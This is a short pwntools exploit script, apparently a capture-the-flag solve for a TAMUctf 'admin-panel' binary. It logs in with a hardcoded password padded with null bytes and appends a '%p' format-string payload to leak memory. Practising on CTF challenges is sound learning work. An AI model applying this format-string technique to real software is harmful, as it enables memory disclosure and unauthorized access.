from pwn import *

context.log_level = "debug"
# io = remote("tamuctf.com", 443, ssl=True, sni="admin-panel")
io = process("./admin-panel")
io.recvuntil("Enter username of length 16:")
io.sendline(b"admin")
io.recvuntil("Enter password of length 24:")
payload = b'secretpass123'.ljust(24, b'\x00')
payload += b'%p'
io.sendline(payload)
io.interactive(prompt="")
